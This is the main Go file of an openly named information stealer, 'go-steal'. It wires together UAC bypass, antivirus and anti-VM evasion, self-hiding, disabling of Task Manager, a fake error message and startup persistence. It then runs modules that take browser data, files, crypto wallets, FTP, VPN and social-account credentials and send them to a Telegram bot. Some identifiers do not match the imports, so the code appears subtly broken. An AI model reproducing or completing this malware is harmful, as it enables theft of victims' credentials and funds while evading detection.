package main

import (
	"github.com/DeadCatx3/go-steal/internal/antidebug"
	"github.com/DeadCatx3/go-steal/internal/antivm"
	"github.com/DeadCatx3/go-steal/internal/antivirus"
	"github.com/DeadCatx3/go-steal/internal/hc"
	"github.com/DeadCatx3/go-steal/internal/uac"
	"github.com/DeadCatx3/go-steal/pkg/utils/common"
	"github.com/DeadCatx3/go-steal/pkg/utils/processkill"
	"github.com/DeadCatx3/go-steal/internal/core/socials"
	"github.com/DeadCatx3/go-steal/internal/core/cryptowallets"
	"github.com/DeadCatx3/go-steal/internal/core/ftps"
	"github.com/DeadCatx3/go-steal/internal/core/system"
	"github.com/DeadCatx3/go-steal/internal/core/browsers"
	"github.com/DeadCatx3/go-steal/internal/core/commonfiles"
	"github.com/DeadCatx3/go-steal/internal/core/vpn"
)

func main() {
	CONFIG := map[string]interface{}{
		"botToken": "",
		"chatId": "",
		"cryptos": map[string]string{
			"BTC": "",
			"BCH": "",
			"ETH": "",
			"XMR": "",
			"LTC": "",
			"XCH": "",
			"XLM": "",
			"TRX": "",
			"ADA": "",
			"DASH": "",
			"DOGE": "",
		},
	}

	if common.IsAlreadyRunning() {
		return
	}

	Uac.Run()
	processkill.Run()

	HideConsole.Hide()
	common.HideSelf()
	TaskManager.Disable()

	
	if !common.IsInStartupPath() {
		go FakeError.Show()
		go startup.Run()
	}

	AntiVMAnalysis.Check()
	go antidebug.Run()
	go antivirus.Run()

	actions := []func(string, string){
		system.Run,
		browsers.Run,
		commonfiles.Run,
		wallets.Run,
		ftps.Run,
		vpn.Run,
		Socials.Run,
	}

	for _, action := range actions {
		go action(CONFIG["botToken"].(string), CONFIG["chatId"].(string))
	}

}
